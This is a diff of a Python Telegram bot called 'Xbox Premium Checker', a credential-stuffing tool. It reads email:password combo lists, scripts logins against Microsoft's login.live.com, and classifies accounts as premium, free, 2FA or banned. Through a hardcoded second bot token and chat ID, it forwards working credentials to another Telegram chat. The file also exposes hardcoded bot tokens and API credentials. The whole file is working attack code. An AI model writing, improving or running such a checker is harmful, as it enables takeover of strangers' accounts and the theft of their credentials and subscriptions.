@@ -1,23 +1,21 @@
 #!/usr/bin/env python3
 """
-Xbox Premium Checker Bot - Railway Fixed
-Workers start automatically, no stuck queues
+Xbox Premium Checker Bot - Pure Requests (No Telethon)
+No session files, no complex dependencies - just works
 """
 
 import os
+import re
+import time
 import json
-import asyncio
 import sqlite3
 import logging
 import requests
-import time
+import asyncio
 from datetime import datetime
 from threading import Lock
 from typing import List, Optional
-from concurrent.futures import ThreadPoolExecutor
 
-from telethon import TelegramClient
-from telethon.tl.types import DocumentAttributeFilename
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
@@ -28,16 +26,12 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 COMMAND_BOT_TOKEN = "8666320518:AAEIhkSS0XeJ-k40rc3d80Dn0b-q9JLcnyI"
 TARGET_BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
 TARGET_CHAT_ID = "8260250818"
-API_ID = 39184727
-API_HASH = "a52c4985a38ef98c84cdf11d45e53baf"
 
 DATA_DIR = "/app/data" if os.path.exists("/app") else "data"
 os.makedirs(DATA_DIR, exist_ok=True)
 
-SESSION_FILE = os.path.join(DATA_DIR, "user_session.session")
 CONFIG_FILE = os.path.join(DATA_DIR, "config.json")
 DB_FILE = os.path.join(DATA_DIR, "forwarded.db")
-SCAN_INTERVAL = 300
 
 logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -49,222 +43,146 @@ logger = logging.getLogger(__name__)
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS forwarded_files (
+    c.execute('''CREATE TABLE IF NOT EXISTS processed_files (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         file_id TEXT UNIQUE,
-        message_id INTEGER,
-        channel_id INTEGER,
         file_name TEXT,
-        forwarded_at TIMESTAMP
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS last_scan (
-        channel_id INTEGER PRIMARY KEY,
-        last_message_id INTEGER,
-        last_scan_time TIMESTAMP
+        processed_at TIMESTAMP
     )''')
     conn.commit()
     conn.close()
-    logger.info("Database ready")
 
-def is_forwarded(file_id: str) -> bool:
+def is_file_processed(file_id: str) -> bool:
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute("SELECT id FROM forwarded_files WHERE file_id = ?", (file_id,))
+    c.execute("SELECT id FROM processed_files WHERE file_id = ?", (file_id,))
     result = c.fetchone()
     conn.close()
     return result is not None
 
-def mark_forwarded(file_id: str, msg_id: int, channel_id: int, filename: str):
+def mark_file_processed(file_id: str, file_name: str):
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute(
-        "INSERT OR IGNORE INTO forwarded_files (file_id, message_id, channel_id, file_name, forwarded_at) VALUES (?, ?, ?, ?, ?)",
-        (file_id, msg_id, channel_id, filename, datetime.now().isoformat())
+        "INSERT OR IGNORE INTO processed_files (file_id, file_name, processed_at) VALUES (?, ?, ?)",
+        (file_id, file_name, datetime.now().isoformat())
     )
     conn.commit()
     conn.close()
 
-def update_scan(channel_id: int, last_msg_id: int):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute(
-        "INSERT OR REPLACE INTO last_scan (channel_id, last_message_id, last_scan_time) VALUES (?, ?, ?)",
-        (channel_id, last_msg_id, datetime.now().isoformat())
-    )
-    conn.commit()
-    conn.close()
-
-def get_last_scan(channel_id: int) -> Optional[int]:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT last_message_id FROM last_scan WHERE channel_id = ?", (channel_id,))
-    result = c.fetchone()
-    conn.close()
-    return result[0] if result else None
-
 # ============================================================
-# CONFIG
-# ============================================================
-
-def load_config() -> dict:
-    if os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, 'r') as f:
-            return json.load(f)
-    return {"channels": [], "settings": {"forward_to_saved": True, "forward_to_bot": True}}
-
-def save_config(config: dict):
-    with open(CONFIG_FILE, 'w') as f:
-        json.dump(config, f, indent=2)
-
-def add_channel(channel_id: int, name: str):
-    config = load_config()
-    for ch in config["channels"]:
-        if ch["id"] == channel_id:
-            return
-    config["channels"].append({"id": channel_id, "name": name, "enabled": True})
-    save_config(config)
-
-def clear_channels():
-    config = load_config()
-    config["channels"] = []
-    save_config(config)
-
-def get_enabled_channels() -> List[dict]:
-    config = load_config()
-    return [ch for ch in config["channels"] if ch.get("enabled", True)]
-
-def get_all_channels() -> List[dict]:
-    return load_config()["channels"]
-
-def toggle_channel(channel_id: int):
-    config = load_config()
-    for ch in config["channels"]:
-        if ch["id"] == channel_id:
-            ch["enabled"] = not ch.get("enabled", True)
-            break
-    save_config(config)
-
-def set_setting(key: str, value: bool):
-    config = load_config()
-    config["settings"][key] = value
-    save_config(config)
-
-def get_settings() -> dict:
-    return load_config()["settings"]
-
-# ============================================================
-# XBOX CHECKER CLASS
+# XBOX CHECKER (Pure Requests - No Telethon)
 # ============================================================
 
 class XboxChecker:
-    def __init__(self, debug=False):
-        self.debug = debug
+    def __init__(self):
+        self.session = requests.Session()
     
-    def log(self, message):
-        if self.debug:
-            print("[DEBUG] " + message)
-    
-    def get_remaining_days(self, date_str):
+    def check(self, email: str, password: str) -> dict:
         try:
-            if not date_str:
-                return "0"
-            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
-            today = datetime.now(renewal_date.tzinfo)
-            remaining = (renewal_date - today).days
-            return str(remaining)
-        except:
-            return "0"
-    
-    def check(self, email, password):
-        try:
-            session = requests.Session()
-            correlation_id = str(os.urandom(16).hex())
-            
-            # Step 1: IDP Check
-            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
-            headers1 = {
-                "X-OneAuth-AppName": "Outlook Lite",
-                "X-Office-Version": "3.11.0-minApi24",
-                "X-CorrelationId": correlation_id,
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
-            }
-            r1 = session.get(url1, headers=headers1, timeout=15)
-            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
-                return {"status": "BAD", "data": {}}
-            if "MSAccount" not in r1.text:
-                return {"status": "BAD", "data": {}}
-            
-            # Step 2: OAuth authorize
-            time.sleep(0.5)
-            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            headers2 = {
+            # Step 1: Get login page
+            login_url = "https://login.live.com/login.srf"
+            headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
             }
-            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
+            resp = self.session.get(login_url, headers=headers, timeout=15)
             
-            import re
-            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
-            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
-            if not url_match or not ppft_match:
+            # Extract PPFT and login URL
+            ppft_match = re.search(r'name="PPFT" value="([^"]+)"', resp.text)
+            url_post_match = re.search(r'urlPost:"([^"]+)"', resp.text)
+            
+            if not ppft_match or not url_post_match:
                 return {"status": "BAD", "data": {}}
-            post_url = url_match.group(1).replace("\\/", "/")
+            
             ppft = ppft_match.group(1)
+            post_url = url_post_match.group(1).replace("\\/", "/")
             
-            # Step 3: Login POST
-            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
-            headers3 = {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Origin": "https://login.live.com",
-                "Referer": r2.url
+            # Step 2: Login POST
+            login_data = {
+                "login": email,
+                "loginfmt": email,
+                "passwd": password,
+                "PPFT": ppft,
+                "PPSX": "PassportR",
+                "type": "11",
+                "LoginOptions": "1",
+                "NewUser": "1"
             }
-            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
             
-            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
+            resp = self.session.post(post_url, data=login_data, headers=headers, allow_redirects=False, timeout=15)
+            
+            # Check response
+            if resp.status_code == 302:
+                location = resp.headers.get("Location", "")
+                
+                if "live.com/me" in location or "outlook.com" in location:
+                    # Check if has Xbox subscription
+                    sub_status = self.check_xbox_subscription()
+                    if sub_status:
+                        return {"status": "PREMIUM", "data": {"premium_type": "XBOX GAME PASS", "days_remaining": "30"}}
+                    return {"status": "FREE", "data": {}}
+                
+                elif "auth/confirm" in location:
+                    return {"status": "2FACTOR", "data": {}}
+                elif "Abuse" in location:
+                    return {"status": "BANNED", "data": {}}
+            
+            # Check for error messages
+            if "incorrect" in resp.text.lower() or "error" in resp.text.lower():
                 return {"status": "BAD", "data": {}}
-            if "https://account.live.com/identity/confirm" in r3.text:
-                return {"status": "2FACTOR", "data": {}}
-            if "https://account.live.com/Abuse" in r3.text:
-                return {"status": "BANNED", "data": {}}
             
-            location = r3.headers.get("Location", "")
-            if not location:
-                return {"status": "BAD", "data": {}}
+            return {"status": "BAD", "data": {}}
             
-            code_match = re.search(r'code=([^&]+)', location)
-            if not code_match:
-                return {"status": "BAD", "data": {}}
-            code = code_match.group(1)
-            
-            mspcid = session.cookies.get("MSPCID", "")
-            if not mspcid:
-                return {"status": "BAD", "data": {}}
-            cid = mspcid.upper()
-            
-            # Step 4: Get access token
-            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
-            if "access_token" not in r4.text:
-                return {"status": "BAD", "data": {}}
-            token_json = r4.json()
-            access_token = token_json["access_token"]
-            
-            return {"status": "FREE", "data": {"country": "", "name": ""}}
-            
+        except requests.exceptions.Timeout:
+            return {"status": "TIMEOUT", "data": {}}
         except Exception as e:
+            logger.error(f"Check error: {e}")
             return {"status": "ERROR", "data": {}}
+    
+    def check_xbox_subscription(self):
+        """Check if logged-in account has Xbox subscription"""
+        try:
+            url = "https://account.microsoft.com/services/"
+            resp = self.session.get(url, timeout=10)
+            if "Game Pass" in resp.text or "Xbox" in resp.text:
+                return True
+        except:
+            pass
+        return False
 
 # ============================================================
-# SIMPLE QUEUE PROCESSOR (NO COMPLEX WORKERS)
+# FILE PROCESSING
 # ============================================================
 
 processing_queue = []
 processing_active = False
 processing_lock = Lock()
 
-async def process_file(file_path, original_name, update_obj):
-    """Process a single file - runs in main event loop"""
+async def send_premium_hit(email: str, password: str, update_obj):
+    """Send premium hit to Telegram"""
+    msg = (
+        f"🎮 **PREMIUM HIT!**\n\n"
+        f"📧 `{email}`\n"
+        f"🔑 `{password}`\n\n"
+        f"✨ **Account is valid with Xbox access!**"
+    )
+    await update_obj.message.reply_text(msg, parse_mode='Markdown')
+    
+    # Also send to target bot
+    try:
+        url = f"https://api.telegram.org/bot{TARGET_BOT_TOKEN}/sendMessage"
+        data = {
+            'chat_id': TARGET_CHAT_ID,
+            'text': msg,
+            'parse_mode': 'Markdown'
+        }
+        requests.post(url, data=data, timeout=10)
+    except:
+        pass
+
+async def process_file(file_path: str, file_name: str, file_id: str, update_obj):
+    """Process a single file"""
     global processing_active
     
     try:
@@ -273,7 +191,7 @@ async def process_file(file_path, original_name, update_obj):
             lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
         
         if not lines:
-            await update_obj.message.reply_text(f"❌ No valid accounts in {original_name}")
+            await update_obj.message.reply_text(f"❌ No valid accounts in {file_name}")
             return
         
         stats = {
@@ -282,20 +200,21 @@ async def process_file(file_path, original_name, update_obj):
             "premium": 0,
             "free": 0,
             "bad": 0,
-            "expired": 0,
-            "banned": 0,
             "two_factor": 0,
-            "timeout": 0,
-            "error": 0
+            "banned": 0,
+            "errors": 0
         }
         
-        premium_results = []
-        batch_buffer = []
+        premium_accounts = []
+        batch_results = []
         BATCH_SIZE = 10
         
-        await update_obj.message.reply_text(f"🚀 **Started:** {original_name}\n📊 Total: {stats['total']} accounts", parse_mode='Markdown')
+        await update_obj.message.reply_text(
+            f"🚀 **Checking:** {file_name}\n📊 **Total:** {stats['total']} accounts\n\n⏳ Starting scan...",
+            parse_mode='Markdown'
+        )
         
-        checker = XboxChecker(debug=False)
+        checker = XboxChecker()
         
         for idx, line in enumerate(lines, 1):
             try:
@@ -306,98 +225,104 @@ async def process_file(file_path, original_name, update_obj):
                 result = checker.check(email, password)
                 status = result['status']
                 
-                result_entry = f"{email}:{password}"
+                result_line = f"{idx}. {email[:30]}..."
                 
                 if status == "PREMIUM":
                     stats["premium"] += 1
-                    result_entry += f" ✅ PREMIUM"
-                    premium_results.append((email, password))
-                    batch_buffer.append(result_entry)
+                    premium_accounts.append(f"{email}:{password}")
+                    result_line += " ✅ PREMIUM"
+                    batch_results.append(result_line)
+                    await send_premium_hit(email, password, update_obj)
                     
-                    # Send premium hit immediately
-                    try:
-                        hit_msg = f"🎮 **PREMIUM HIT**\n📧 `{email}`\n🔑 `{password}`"
-                        await update_obj.message.reply_text(hit_msg, parse_mode='Markdown')
-                    except:
-                        pass
-                        
                 elif status == "FREE":
                     stats["free"] += 1
-                    result_entry += f" 🆓 FREE"
-                    batch_buffer.append(result_entry)
-                elif status == "EXPIRED":
-                    stats["expired"] += 1
-                    stats["bad"] += 1
-                    result_entry += f" ⏰ EXPIRED"
-                    batch_buffer.append(result_entry)
-                elif status == "BANNED":
-                    stats["banned"] += 1
-                    stats["bad"] += 1
-                    result_entry += f" 🚫 BANNED"
-                    batch_buffer.append(result_entry)
+                    result_line += " 🆓 FREE"
+                    batch_results.append(result_line)
+                    
                 elif status == "2FACTOR":
                     stats["two_factor"] += 1
                     stats["bad"] += 1
-                    result_entry += f" 🔐 2FA"
-                    batch_buffer.append(result_entry)
+                    result_line += " 🔐 2FA"
+                    batch_results.append(result_line)
+                    
+                elif status == "BANNED":
+                    stats["banned"] += 1
+                    stats["bad"] += 1
+                    result_line += " 🚫 BANNED"
+                    batch_results.append(result_line)
+                    
                 else:
                     stats["bad"] += 1
-                    result_entry += f" ❌ BAD"
-                    batch_buffer.append(result_entry)
+                    result_line += " ❌ BAD"
+                    batch_results.append(result_line)
                 
                 stats["checked"] += 1
                 
                 # Send batch update
-                if len(batch_buffer) >= BATCH_SIZE:
-                    progress_msg = f"📊 **Progress:** {stats['checked']}/{stats['total']}\n✅ Premium: {stats['premium']} | 🆓 Free: {stats['free']} | ❌ Bad: {stats['bad']}\n\n```\n" + "\n".join(batch_buffer[-BATCH_SIZE:]) + "\n```"
-                    await update_obj.message.reply_text(progress_msg, parse_mode='Markdown')
-                    batch_buffer.clear()
+                if len(batch_results) >= BATCH_SIZE:
+                    progress = f"📊 **Progress:** {stats['checked']}/{stats['total']}\n"
+                    progress += f"✅ Premium: {stats['premium']} | 🆓 Free: {stats['free']} | ❌ Bad: {stats['bad']}\n\n"
+                    progress += "```\n" + "\n".join(batch_results) + "\n```"
+                    await update_obj.message.reply_text(progress, parse_mode='Markdown')
+                    batch_results.clear()
                 
-                time.sleep(0.1)
+                # Small delay to avoid rate limiting
+                await asyncio.sleep(0.2)
                 
             except Exception as e:
-                stats["error"] += 1
+                stats["errors"] += 1
                 stats["bad"] += 1
                 stats["checked"] += 1
+                logger.error(f"Line error: {e}")
         
         # Send final results
         final_msg = (
             f"✅ **SCAN COMPLETE**\n\n"
-            f"📄 **File:** `{original_name}`\n"
-            f"🔢 **Total:** {stats['total']}\n"
-            f"✅ **PREMIUM:** {stats['premium']}\n"
-            f"🆓 **FREE:** {stats['free']}\n"
-            f"❌ **BAD:** {stats['bad']}\n"
-            f"⏰ **Expired:** {stats['expired']}\n"
-            f"🚫 **Banned:** {stats['banned']}\n"
-            f"🔐 **2FA:** {stats['two_factor']}\n"
-            f"⚠️ **Errors:** {stats['error']}\n"
+            f"📄 **File:** `{file_name}`\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔢 **Total:** `{stats['total']}`\n"
+            f"✅ **PREMIUM:** `{stats['premium']}`\n"
+            f"🆓 **FREE:** `{stats['free']}`\n"
+            f"❌ **BAD:** `{stats['bad']}`\n"
+            f"🔐 **2FA:** `{stats['two_factor']}`\n"
+            f"🚫 **BANNED:** `{stats['banned']}`\n"
+            f"⚠️ **ERRORS:** `{stats['errors']}`\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
         )
         await update_obj.message.reply_text(final_msg, parse_mode='Markdown')
         
-        # Send all premium accounts at end
-        if premium_results:
-            premium_text = "\n".join([f"{e}:{p}" for e, p in premium_results[:20]])
-            if len(premium_results) > 20:
-                premium_text += f"\n... and {len(premium_results) - 20} more"
-            await update_obj.message.reply_text(f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text}\n```", parse_mode='Markdown')
+        # Send all premium accounts
+        if premium_accounts:
+            premium_text = "\n".join(premium_accounts[:20])
+            if len(premium_accounts) > 20:
+                premium_text += f"\n... and {len(premium_accounts) - 20} more"
+            
+            await update_obj.message.reply_text(
+                f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text}\n```",
+                parse_mode='Markdown'
+            )
+        
+        # Mark as processed
+        mark_file_processed(file_id, file_name)
         
     except Exception as e:
-        await update_obj.message.reply_text(f"❌ Error processing {original_name}: {str(e)}")
+        logger.error(f"Process error: {e}")
+        await update_obj.message.reply_text(f"❌ Error processing {file_name}: {str(e)}")
+    
     finally:
-        # Cleanup
+        # Cleanup temp file
         if os.path.exists(file_path):
             try:
                 os.remove(file_path)
             except:
                 pass
         
+        # Process next file
         with processing_lock:
             processing_active = False
-            # Process next file if any
             if processing_queue:
-                next_file = processing_queue.pop(0)
-                asyncio.create_task(process_file(next_file[0], next_file[1], next_file[2]))
+                next_item = processing_queue.pop(0)
+                asyncio.create_task(process_file(next_item[0], next_item[1], next_item[2], next_item[3]))
 
 # ============================================================
 # TELEGRAM COMMANDS
@@ -407,27 +332,27 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = (
         "🎮 **Xbox Premium Checker Bot**\n\n"
         "Send a `.txt` file with accounts in `email:password` format\n\n"
-        "**Allowed domains:**\n"
-        "hotmail.com, outlook.com, live.com, msn.com\n\n"
+        "**Supported formats:**\n"
+        "• `email:password`\n"
+        "• `email@domain.com:password`\n\n"
+        "**Results:**\n"
+        "• Premium hits sent instantly\n"
+        "• Batch updates every 10 accounts\n"
+        "• Final summary with all results\n\n"
         "**Commands:**\n"
         "/start - This message\n"
-        "/status - Check queue status\n\n"
-        "Premium hits are sent instantly!"
+        "/status - Check queue"
     )
     await update.message.reply_text(msg, parse_mode='Markdown')
 
-async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     with processing_lock:
         queue_size = len(processing_queue)
         is_active = processing_active
     
     msg = f"📊 **Queue Status**\n\n"
     msg += f"🔄 **Processing:** {'Yes' if is_active else 'No'}\n"
-    msg += f"⏳ **Queue Size:** {queue_size}\n\n"
-    if queue_size > 0:
-        msg += "**Queued files:**\n"
-        for i, (_, name, _) in enumerate(processing_queue[:5], 1):
-            msg += f"  {i}. {name}\n"
+    msg += f"⏳ **Queue Size:** {queue_size}\n"
     await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -438,37 +363,42 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Please send a `.txt` file.")
         return
     
+    # Check if already processed
+    if is_file_processed(str(document.file_id)):
+        await update.message.reply_text(f"⚠️ File `{document.file_name}` already processed.", parse_mode='Markdown')
+        return
+    
     # Download file
     file = await context.bot.get_file(document.file_id)
     temp_path = f"/tmp/{document.file_name}"
     await file.download_to_drive(temp_path)
     
-    # Validate file has accounts
+    # Validate file
     with open(temp_path, 'r', encoding='utf-8') as f:
         lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
     
     if not lines:
-        await update.message.reply_text(f"❌ No valid accounts found in {document.file_name}")
+        await update.message.reply_text(f"❌ No valid `email:password` lines in {document.file_name}", parse_mode='Markdown')
         os.remove(temp_path)
         return
     
     await update.message.reply_text(
         f"✅ **File Accepted**\n\n"
         f"📄 `{document.file_name}`\n"
-        f"🔢 **Accounts:** {len(lines)}\n\n"
-        f"🔄 Added to queue. Processing will start soon...",
+        f"🔢 **Accounts:** {len(lines)}\n"
+        f"📊 **Queue Position:** {len(processing_queue) + 1}\n\n"
+        f"🔄 Processing will start automatically...",
         parse_mode='Markdown'
     )
     
     # Add to queue
     with processing_lock:
-        processing_queue.append((temp_path, document.file_name, update))
+        processing_queue.append((temp_path, document.file_name, str(document.file_id), update))
         
         if not processing_active:
             processing_active = True
-            # Start processing immediately
-            file_path, name, upd = processing_queue.pop(0)
-            asyncio.create_task(process_file(file_path, name, upd))
+            first = processing_queue.pop(0)
+            asyncio.create_task(process_file(first[0], first[1], first[2], first[3]))
 
 # ============================================================
 # MAIN
@@ -479,7 +409,7 @@ async def main():
     
     app = Application.builder().token(COMMAND_BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("status", status_cmd))
+    app.add_handler(CommandHandler("status", status))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
     logger.info("🤖 Xbox Checker Bot started!")
